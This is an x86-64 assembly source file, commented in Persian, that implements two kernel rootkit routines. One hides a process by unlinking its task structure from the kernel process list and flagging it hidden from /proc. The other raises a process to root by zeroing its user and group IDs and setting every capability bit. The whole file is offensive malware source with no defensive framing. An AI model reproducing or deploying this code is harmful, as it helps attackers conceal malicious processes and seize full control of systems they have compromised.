section .text
global hide_process, elevate_privileges

%include "process_struct.inc"

hide_process:
    ; RDI = PID پردازه هدف
    mov rax, [task_struct_ptr]
    .search_loop:
        test rax, rax
        jz .not_found
        mov ebx, [rax + TASK_STRUCT_PID]
        cmp ebx, edi
        je .found
        mov rax, [rax + TASK_STRUCT_NEXT]
        jmp .search_loop
    
    .found:
        ; حذف از لیست پردازه‌ها
        mov rbx, [rax + TASK_STRUCT_PREV]
        mov rcx, [rax + TASK_STRUCT_NEXT]
        mov [rbx + TASK_STRUCT_NEXT], rcx
        mov [rcx + TASK_STRUCT_PREV], rbx
        
        ; پنهان‌سازی در /proc
        mov byte [rax + TASK_STRUCT_HIDDEN], 1
        ret
    
    .not_found:
        ret

elevate_privileges:
    ; RDI = آدرس task_struct
    ; تنظیم UID/GID به 0
    mov dword [rdi + TASK_STRUCT_CRED + CRED_UID], 0
    mov dword [rdi + TASK_STRUCT_CRED + CRED_GID], 0
    mov dword [rdi + TASK_STRUCT_CRED + CRED_EUID], 0
    mov dword [rdi + TASK_STRUCT_CRED + CRED_EGID], 0
    
    ; فعال‌سازی تمام قابلیت‌ها
    mov qword [rdi + TASK_STRUCT_CRED + CRED_CAP_EFFECTIVE], -1
    mov qword [rdi + TASK_STRUCT_CRED + CRED_CAP_PERMITTED], -1
    mov qword [rdi + TASK_STRUCT_CRED + CRED_CAP_INHERITABLE], -1
    ret
    